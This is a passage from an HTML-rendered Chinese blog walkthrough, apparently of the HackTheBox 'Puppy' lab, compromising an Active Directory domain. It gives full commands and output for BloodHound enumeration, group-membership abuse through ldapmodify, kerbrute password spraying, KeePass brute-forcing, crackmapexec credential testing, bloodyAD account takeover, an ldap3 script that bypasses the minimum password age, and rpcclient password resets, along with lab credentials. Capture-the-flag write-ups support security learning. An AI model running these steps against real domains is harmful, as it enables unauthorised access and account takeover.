href="#bloodhoudn攻击路线分析" class="headerlink" title="bloodhoudn攻击路线分析"></a>bloodhoudn攻击路线分析</h4><p>然后利用bloodhoudn进行一些枚举</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/htb/8/1]</span><br><span class="line">└─# bloodhound-python -d puppy.htb -dc dc.puppy.htb -u levi.james -p &#x27;KingofAkron2025!&#x27; -c All -ns 10.10.11.70 --dns-timeout 15 --dns-tcp -o bloodhound.json</span><br><span class="line"></span><br><span class="line">INFO: Found AD domain: puppy.htb</span><br><span class="line">INFO: Getting TGT for user</span><br><span class="line">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br><span class="line">INFO: Connecting to LDAP server: dc.puppy.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains in the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc.puppy.htb</span><br><span class="line">INFO: Found 10 users</span><br><span class="line">INFO: Found 56 groups</span><br><span class="line">INFO: Found 3 gpos</span><br><span class="line">INFO: Found 3 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: DC.PUPPY.HTB</span><br><span class="line">ERROR: Unhandled exception in computer DC.PUPPY.HTB processing: The NETBIOS connection with the remote host timed out.</span><br><span class="line">INFO: Traceback (most recent call last):</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/htb/8/1]</span><br><span class="line">└─# sudo neo4j console</span><br><span class="line"></span><br><span class="line">Directories in use:</span><br><span class="line">home:         /usr/share/neo4j</span><br><span class="line">config:       /usr/share/neo4j/conf</span><br><span class="line">logs:         /etc/neo4j/logs</span><br><span class="line">plugins:      /usr/share/neo4j/plugins</span><br><span class="line">import:       /usr/share/neo4j/import</span><br><span class="line">data:         /etc/neo4j/data</span><br><span class="line">certificates: /usr/share/neo4j/certificates</span><br><span class="line">licenses:     /usr/share/neo4j/licenses</span><br><span class="line">run:          /var/lib/neo4j/run</span><br><span class="line">Starting Neo4j.</span><br><span class="line">2025-07-23 12:31:04.563+0000 INFO  Starting...</span><br><span class="line">2025-07-23 12:31:05.319+0000 INFO  This instance is ServerId&#123;7f6c1dca&#125; (7f6c1dca-059c-4e0b-b189-7ba241b8a56d)</span><br><span class="line">2025-07-23 12:31:07.107+0000 INFO  ======== Neo4j 4.4.26 ========</span><br><span class="line">2025-07-23 12:31:09.136+0000 INFO  Performing postInitialization step for component &#x27;security-users&#x27; with version 3 and status CURRENT</span><br><span class="line">2025-07-23 12:31:09.136+0000 INFO  Updating the initial password in component &#x27;security-users&#x27;</span><br><span class="line">2025-07-23 12:31:09.445+0000 INFO  Bolt enabled on localhost:7687.</span><br><span class="line">2025-07-23 12:31:10.918+0000 INFO  Remote interface available at http://localhost:7474/</span><br><span class="line">2025-07-23 12:31:10.925+0000 INFO  id: 108D734EF023B8E7D0237E6A765BEE9A1E0C75B0D1C260D7A56C79C35E49FA81</span><br><span class="line">2025-07-23 12:31:10.925+0000 INFO  name: system</span><br><span class="line">2025-07-23 12:31:10.925+0000 INFO  creationDate: 2025-07-23T11:58:58.773Z</span><br><span class="line">2025-07-23 12:31:10.925+0000 INFO  Started.</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/myift/BloodHound-linux-x64]</span><br><span class="line">└─# ./BloodHound --no-sandbox</span><br><span class="line">(node:6869) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more information</span><br><span class="line">(node:6933) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250724183249028.png" alt="image-20250724183249028"></p><p>导入文件</p><p><code>LEVI.JAMES</code> 是 <code>HR@PUPPY.HTB</code> 的成员 → <code>MemberOf</code> 边表示“属于该组”</p><p><code>HR@PUPPY.HTB</code> 对 <code>DEVELOPERS@PUPPY.HTB</code> 拥有 <code>GenericWrite</code> 权限</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250724183645924.png" alt="image-20250724183645924"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250724183228439.png" alt="image-20250724183228439"></p><p>意味着组 <code>HR</code> 的成员（也就是你现在的用户 <code>LEVI.JAMES</code>）可以<strong>修改 DEVELOPERS 组的某些属性</strong></p><p>常见攻击利用方式：</p><p><strong>向 DEVELOPERS 添加新成员</strong>（即使当前用户没有直接写权限，也可以通过组滥用做到）；</p><p>如果 <code>DEVELOPERS</code> 组中有高权限用户（如域管或服务账号），可以<strong>利用该组权限间接提升权限</strong>。</p><p>我们将自己加到DEVELOPERS组中</p><p>加之前</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250724195433100.png" alt="image-20250724195433100"></p><p>确认levi.james 的 Distinguished Name（DN）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/1/1]</span><br><span class="line">└─# ldapsearch -x -H ldap://dc.puppy.htb -D &quot;levi.james@puppy.htb&quot; -w &#x27;KingofAkron2025!&#x27; -b &quot;DC=puppy,DC=htb&quot; &quot;(sAMAccountName=levi.james)&quot; dn</span><br><span class="line"></span><br><span class="line"># extended LDIF</span><br><span class="line">#</span><br><span class="line"># LDAPv3</span><br><span class="line"># base &lt;DC=puppy,DC=htb&gt; with scope subtree</span><br><span class="line"># filter: (sAMAccountName=levi.james)</span><br><span class="line"># requesting: dn </span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># Levi B. James, MANPOWER, PUPPY.HTB</span><br><span class="line">dn: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB</span><br><span class="line"></span><br><span class="line"># search reference</span><br><span class="line">ref: ldap://ForestDnsZones.PUPPY.HTB/DC=ForestDnsZones,DC=PUPPY,DC=HTB</span><br><span class="line"></span><br><span class="line"># search reference</span><br><span class="line">ref: ldap://DomainDnsZones.PUPPY.HTB/DC=DomainDnsZones,DC=PUPPY,DC=HTB</span><br><span class="line"></span><br><span class="line"># search reference</span><br><span class="line">ref: ldap://PUPPY.HTB/CN=Configuration,DC=PUPPY,DC=HTB</span><br><span class="line"></span><br><span class="line"># search result</span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"># numResponses: 5</span><br><span class="line"># numEntries: 1</span><br><span class="line"># numReferences: 3</span><br><span class="line">                                                                      </span><br></pre></td></tr></table></figure><p>构造 LDIF 文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/1/1]</span><br><span class="line">└─# vim add_to_developers.ldif</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/1/1]</span><br><span class="line">└─# cat add_to_developers.ldif </span><br><span class="line">dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB</span><br><span class="line">changetype: modify</span><br><span class="line">add: member</span><br><span class="line">member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB//这里就是DN</span><br><span class="line">                                                                                                             </span><br></pre></td></tr></table></figure><p>执行修改操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                              </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/1/1]</span><br><span class="line">└─# ldapmodify -x -H ldap://dc.puppy.htb -D &quot;levi.james@puppy.htb&quot; -w &#x27;KingofAkron2025!&#x27; -f add_to_developers.ldif</span><br><span class="line">modifying entry &quot;CN=DEVELOPERS,DC=PUPPY,DC=HTB&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/1/1]</span><br><span class="line">└─# ldapsearch -x -H ldap://dc.puppy.htb -D &quot;levi.james@puppy.htb&quot; -w &#x27;KingofAkron2025!&#x27; -b &quot;CN=DEVELOPERS,DC=PUPPY,DC=HTB&quot; member</span><br><span class="line"># extended LDIF</span><br><span class="line">#</span><br><span class="line"># LDAPv3</span><br><span class="line"># base &lt;CN=DEVELOPERS,DC=PUPPY,DC=HTB&gt; with scope subtree</span><br><span class="line"># filter: (objectclass=*)</span><br><span class="line"># requesting: member </span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># DEVELOPERS, PUPPY.HTB</span><br><span class="line">dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB</span><br><span class="line">member: CN=Jamie S. Williams,CN=Users,DC=PUPPY,DC=HTB</span><br><span class="line">member: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB</span><br><span class="line">member: CN=Anthony J. Edwards,DC=PUPPY,DC=HTB</span><br><span class="line">member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB</span><br><span class="line"></span><br><span class="line"># search result</span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"># numResponses: 2</span><br><span class="line"># numEntries: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功的将Levi B. James加入到了DEVELOPERS组</p><p>DEVELOPERS组的情况</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250725101615465.png" alt="image-20250725101615465"></p><p>全局看一下</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250725112804978.png" alt="image-20250725112804978"></p><p>有个adm账户</p><p>并且有一个</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250725112930213.png" alt="image-20250725112930213"></p><p>感觉这两个账户有关联</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250725160533443.png" alt="image-20250725160533443"></p><p><code>STEPH.COOPER@PUPPY.HTB</code> 用户拥有远程登录权限，并且和域控管理员账号相关</p><p>先设置为高价值用户</p><h4 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h4><p>做一下密码喷洒</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同步一下时间</span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/1/1]</span><br><span class="line">└─# sudo apt install ntpdate -y</span><br><span class="line">sudo ntpdate dc.puppy.htb</span><br><span class="line">收集一下用户名</span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/1/1]</span><br><span class="line">└─# cypher-shell -u neo4j -p &#x27;123456&#x27; &quot;MATCH (u:User) RETURN split(u.name, &#x27;@&#x27;)[0]&quot; | tail -n +2 | sed &#x27;s/&quot;//g&#x27; &gt; users.txt</span><br><span class="line"></span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/1/1]</span><br><span class="line">└─# cat users.txt                                                                                                          </span><br><span class="line">JAMIE.WILLIAMS</span><br><span class="line">ADAM.SILVER</span><br><span class="line">ANT.EDWARDS</span><br><span class="line">LEVI.JAMES</span><br><span class="line">KRBTGT</span><br><span class="line">ADMINISTRATOR</span><br><span class="line">STEPH.COOPER</span><br><span class="line">GUEST</span><br><span class="line">STEPH.COOPER_ADM</span><br><span class="line">NT AUTHORITY</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/1/1]</span><br><span class="line">└─# kerbrute passwordspray --dc dc.puppy.htb -d puppy.htb users.txt &#x27;KingofAkron2025!&#x27; -v</span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (n/a) - 07/25/25 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2025/07/25 09:03:28 &gt;  Using KDC(s):</span><br><span class="line">2025/07/25 09:03:28 &gt;   dc.puppy.htb:88</span><br><span class="line"></span><br><span class="line">2025/07/25 09:04:09 &gt;  [!] NT AUTHORITY@puppy.htb:KingofAkron2025! - User does not exist</span><br><span class="line">2025/07/25 09:04:10 &gt;  [!] STEPH.COOPER_ADM@puppy.htb:KingofAkron2025! - Invalid password</span><br><span class="line">2025/07/25 09:04:10 &gt;  [!] ADAM.SILVER@puppy.htb:KingofAkron2025! - USER LOCKED OUT</span><br><span class="line">2025/07/25 09:04:10 &gt;  [!] GUEST@puppy.htb:KingofAkron2025! - USER LOCKED OUT</span><br><span class="line">2025/07/25 09:04:10 &gt;  [!] JAMIE.WILLIAMS@puppy.htb:KingofAkron2025! - Invalid password</span><br><span class="line">2025/07/25 09:04:10 &gt;  [!] STEPH.COOPER@puppy.htb:KingofAkron2025! - Invalid password</span><br><span class="line">2025/07/25 09:04:10 &gt;  [!] KRBTGT@puppy.htb:KingofAkron2025! - USER LOCKED OUT</span><br><span class="line">2025/07/25 09:04:10 &gt;  [!] ANT.EDWARDS@puppy.htb:KingofAkron2025! - Invalid password</span><br><span class="line">2025/07/25 09:04:10 &gt;  [!] ADMINISTRATOR@puppy.htb:KingofAkron2025! - Invalid password</span><br><span class="line">2025/07/25 09:04:15 &gt;  [+] VALID LOGIN:  LEVI.JAMES@puppy.htb:KingofAkron2025!</span><br><span class="line">2025/07/25 09:04:15 &gt;  Done! Tested 10 logins (1 successes) in 46.247 seconds</span><br><span class="line">                                                                                   </span><br></pre></td></tr></table></figure><p>发现一些用户是USER LOCKED OUT被锁定了包括我们DEVELOPERS组的<a href="mailto:&#x41;&#x44;&#65;&#77;&#x2e;&#x53;&#73;&#76;&#86;&#69;&#82;&#64;&#x70;&#117;&#x70;&#112;&#121;&#x2e;&#x68;&#116;&#98;">ADAM.SILVER@puppy.htb</a></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250725160803364.png" alt="image-20250725160803364"></p><p>ant.edwards对ADAM.SILVER有完全控制权限</p><h4 id="加入新的组后我们的smb权限变化"><a href="#加入新的组后我们的smb权限变化" class="headerlink" title="加入新的组后我们的smb权限变化"></a>加入新的组后我们的smb权限变化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/1/1]</span><br><span class="line">└─# smbmap -H 10.10.11.70 -u &quot;levi.james&quot; -p &#x27;KingofAkron2025!&#x27;                                                                   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\</span><br><span class="line">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span><br><span class="line">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span><br><span class="line">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span><br><span class="line">   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      </span><br><span class="line">The NETBIOS connection with the remote host timed out.                                                                       </span><br><span class="line">                                                                                                                             </span><br><span class="line">[+] IP: 10.10.11.70:445 Name: dc.puppy.htb              Status: Authenticated</span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        DEV                                                     READ ONLY       DEV-SHARE for PUPPY-DEVS</span><br><span class="line">        IPC$                                                    NO ACCESS       Remote IPC</span><br><span class="line">        NETLOGON                                                READ ONLY       Logon server share </span><br><span class="line">        SYSVOL                                                  READ ONLY       Logon server share </span><br><span class="line">[*] Closed 1 connections                                                                                                     </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>多了一个DEV可读</p><p>获取 recovery.kdbx</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/1/1]</span><br><span class="line">└─# smbclient //10.10.11.70/DEV -U &quot;levi.james&quot;</span><br><span class="line"></span><br><span class="line">Password for [WORKGROUP\levi.james]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                  DR        0  Sun Mar 23 03:07:57 2025</span><br><span class="line">  ..                                  D        0  Sat Mar  8 11:52:57 2025</span><br><span class="line">  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025</span><br><span class="line">  Projects                            D        0  Sat Mar  8 11:53:36 2025</span><br><span class="line">  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025</span><br><span class="line"></span><br><span class="line">                5080575 blocks of size 4096. 1643044 blocks available</span><br><span class="line">smb: \&gt; get recovery.kdbx</span><br><span class="line">getting file \recovery.kdbx of size 2677 as recovery.kdbx (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)</span><br><span class="line">smb: \&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件是加密的我们爆破密码</p><h4 id="Keepass2john变种-keepass4brute爆破-kdbx文件"><a href="#Keepass2john变种-keepass4brute爆破-kdbx文件" class="headerlink" title="Keepass2john变种 keepass4brute爆破.kdbx文件"></a>Keepass2john变种 keepass4brute爆破.kdbx文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/1/1]</span><br><span class="line">└─# ./keepass4brute/keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt</span><br><span class="line">keepass4brute 1.3 by r3nt0n</span><br><span class="line">https://github.com/r3nt0n/keepass4brute</span><br><span class="line"></span><br><span class="line">[+] Words tested: 36/14344392 - Attempts per minute: 65 - Estimated time remaining: 21 weeks, 6 days</span><br><span class="line">[+] Current attempt: liverpool</span><br><span class="line"></span><br><span class="line">[*] Password found: liverpool</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接打开数据库看一下里面的信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keepassxc</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250725145256282.png" alt="image-20250725145256282"></p><p>得到密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HJKL2025!</span><br><span class="line">Antman2025!</span><br><span class="line">JamieLove2025!</span><br><span class="line">ILY2025!</span><br><span class="line">Steve2025!</span><br></pre></td></tr></table></figure><p>再加上前面收集的可登录的账户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ANT.EDWARDS</span><br><span class="line">STEPH.COOPER</span><br><span class="line">STEPH.COOPER_ADM</span><br><span class="line">ADMINISTRATOR</span><br><span class="line">JAMIE.WILLIAMS</span><br></pre></td></tr></table></figure><h4 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/1/1]</span><br><span class="line">└─# crackmapexec smb 10.10.11.70 -u use.txt -p passwd.txt </span><br><span class="line">SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ANT.EDWARDS:HJKL2025! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ANT.EDWARDS:Antman2025! </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到ANT.EDWARDS:Antman2025! </p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250725161045219.png" alt="image-20250725161045219"></p><p>上面我们就已经说过ANT.EDWARDS对adam有完全控制权限</p><p>我们直接去</p><h4 id="获取ADAM用户"><a href="#获取ADAM用户" class="headerlink" title="获取ADAM用户"></a>获取ADAM用户</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/8/1/1/2]</span><br><span class="line">└─# bloodyAD -d puppy.htb -u ant.edwards -p Antman2025! --dc-ip 10.10.11.70 remove uac -f LOCKOUT -f ACCOUNTDISABLE adam.silver</span><br><span class="line">[-] [&#x27;LOCKOUT&#x27;, &#x27;ACCOUNTDISABLE&#x27;] property flags removed from adam.silver&#x27;s userAccountControl</span><br><span class="line">                                                                                                             //启动了  adam.silver                                            </span><br><span class="line">┌──(root㉿kali)-[/myift/…/8/1/1/2]</span><br><span class="line">└─# bloodyAD -d puppy.htb -u ant.edwards -p Antman2025! --dc-ip 10.10.11.70 set owner adam.silver ant.edwards</span><br><span class="line">[+] Old owner S-1-5-21-1487982659-1829050783-2281216199-512 is now replaced by ant.edwards on adam.silver</span><br><span class="line">                                                                                                              //将adam.silver用户的“所有者”（Owner）属性，将其设置为 ant.edwards。                                      </span><br></pre></td></tr></table></figure><p>然后修改ant.edwards的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/8/1/1/2]</span><br><span class="line">└─# bloodyAD -d puppy.htb -u ant.edwards -p Antman2025! --dc-ip 10.10.11.70 set password adam.silver Adam@2025!</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/root/.local/bin/bloodyAD&quot;, line 8, in &lt;module&gt;</span><br><span class="line">    sys.exit(main())</span><br><span class="line">             ~~~~^^</span><br><span class="line">  File &quot;/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py&quot;, line 210, in main</span><br><span class="line">    output = args.func(conn, **params)</span><br><span class="line">  File &quot;/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/set.py&quot;, line 273, in password</span><br><span class="line">    raise e</span><br><span class="line">  File &quot;/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/set.py&quot;, line 118, in password</span><br><span class="line">    conn.ldap.bloodymodify(target, &#123;&quot;unicodePwd&quot;: op_list&#125;)</span><br><span class="line">    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &quot;/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py&quot;, line 315, in bloodymodify</span><br><span class="line">    raise err</span><br><span class="line">msldap.commons.exceptions.LDAPModifyException: </span><br><span class="line">Password can&#x27;t be changed before -1 day, 6:27:48.198356 because of the minimum password age policy.         </span><br></pre></td></tr></table></figure><p>这个错误信息非常清晰地指出了问题所在：</p><ol><li><p><strong><code>msldap.commons.exceptions.LDAPModifyException</code></strong>: 这表示在执行 LDAP（轻量级目录访问协议）修改操作时发生了异常。<code>bloodyAD</code> 使用 LDAP 协议与 Active Directory 进行通信。</p></li><li><p><strong><code>Password can&#39;t be changed before -1 day, 6:27:48.198356 because of the minimum password age policy.</code></strong>: 这是问题的关键。它说明：</p><ul><li><strong>“密码不能更改”</strong>：重置密码的操作被拒绝了。</li><li><strong>“因为最小密码期限策略”</strong>：原因是 Active Directory 中存在一项安全策略，叫做**“最小密码期限”（Minimum Password Age）**。</li><li><strong>“在 -1 天，6:27:48.198356 之前”</strong>：这表示 <code>adam.silver</code> 账户的密码在最近一次修改后，<strong>还没有达到域策略要求的最小使用时间</strong>。Active Directory 会强制用户在一定时间（例如，1 天、3 天等）内不能再次更改密码，以防止用户立即将密码改回旧密码，或频繁修改密码来规避其他安全策略。</li></ul><p>这里的 <code>-1 day, 6:27:48.198356</code> 可能表示距离允许修改密码的日期还差 1 天零 6 小时多，或者表示上次修改密码的时间是在 1 天多以前，但还没有达到域控制器规定的最小密码使用期限。通常，当一个账户的密码刚刚被重置或修改后，会进入一个“冷却期”，在这个期限内不允许再次修改。</p><hr></li></ol><h4 id="绕过密码最短修改周期限制"><a href="#绕过密码最短修改周期限制" class="headerlink" title="绕过密码最短修改周期限制"></a>绕过密码最短修改周期限制</h4><p>通过需要修改pwdlastset的时间戳，来绕过这个限制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">绕过原理：</span><br><span class="line">当 pwdLastSet 属性被设置为 0 时，Active Directory 会认为该账户的密码从未设置过，或者处于需要立即更改的状态。在这种情况下，域控制器会忽略“最小密码期限”策略的检查，允许立即设置新密码。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/8/1/1/2]</span><br><span class="line">└─# vim pwdlastsetChagne.py</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/myift/…/8/1/1/2]</span><br><span class="line">└─# python3 pwdlastsetChagne.py</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/myift/…/8/1/1/2]</span><br><span class="line">└─# cat pwdlastsetChagne.py      </span><br><span class="line">import ldap3</span><br><span class="line">server = ldap3.Server(&#x27;10.10.11.70&#x27;, port =389, use_ssl = False)</span><br><span class="line">connection = ldap3.Connection(server, &#x27;CN=ANTHONY J. EDWARDS,DC=PUPPY,DC=HTB&#x27;, &#x27;Antman2025!&#x27;, auto_bind=True)</span><br><span class="line">connection.bind()</span><br><span class="line">connection.extend.standard.who_am_i() # 保持这行代码，但移除后面的多余文本</span><br><span class="line">connection.modify(&#x27;CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB&#x27;,&#123;&#x27;pwdLastSet&#x27;: [(ldap3.MODIFY_REPLACE, [&#x27;0&#x27;])]&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后继续执行修改密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/8/1/1/2]</span><br><span class="line">└─# bloodyAD -d puppy.htb -u ant.edwards -p Antman2025! --dc-ip 10.10.11.70 set password adam.silver Adam@2025!</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/root/.local/bin/bloodyAD&quot;, line 8, in &lt;module&gt;</span><br><span class="line">    sys.exit(main())</span><br><span class="line">             ~~~~^^</span><br><span class="line">  File &quot;/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py&quot;, line 210, in main</span><br><span class="line">    output = args.func(conn, **params)</span><br><span class="line">  File &quot;/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/set.py&quot;, line 273, in password</span><br><span class="line">    raise e</span><br><span class="line">  File &quot;/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/set.py&quot;, line 118, in password</span><br><span class="line">    conn.ldap.bloodymodify(target, &#123;&quot;unicodePwd&quot;: op_list&#125;)</span><br><span class="line">    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &quot;/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py&quot;, line 315, in bloodymodify</span><br><span class="line">    raise err</span><br><span class="line">msldap.commons.exceptions.LDAPModifyException: Password can&#x27;t be changed. It may be because the oldpass provided is not valid.</span><br><span class="line">You can try to use another password change protocol such as smbpasswd, server error may be more explicit.                   </span><br></pre></td></tr></table></figure><p>还是不行</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250725171907968.png" alt="image-20250725171907968"></p><p>不知道为什么没有权限,只有输入旧的密码才行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/8/1/1/2]</span><br><span class="line">└─# rpcclient -U &#x27;puppy.htb\Ant.Edwards%Antman2025!&#x27; 10.10.11.70</span><br><span class="line">rpcclient $&gt; setuserinfo ADAM.SILVER 23 Password@987</span><br><span class="line">rpcclient $&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>换了个方法直接成功了</p><h4 id="winrm远程登录"><a href="#winrm远程登录" class="headerlink" title="winrm远程登录"></a>winrm远程登录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/8/1/1/2]</span><br><span class="line">└─# bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p Antman2025! remove uac &#x27;ADAM.SILVER&#x27; -f ACCOUNTDISABLE</span><br><span class="line">[-] [&#x27;ACCOUNTDISABLE&#x27;] property flags removed from ADAM.SILVER&#x27;s userAccountControl</span><br><span class="line">                                                                                                                                                           </span><br><span 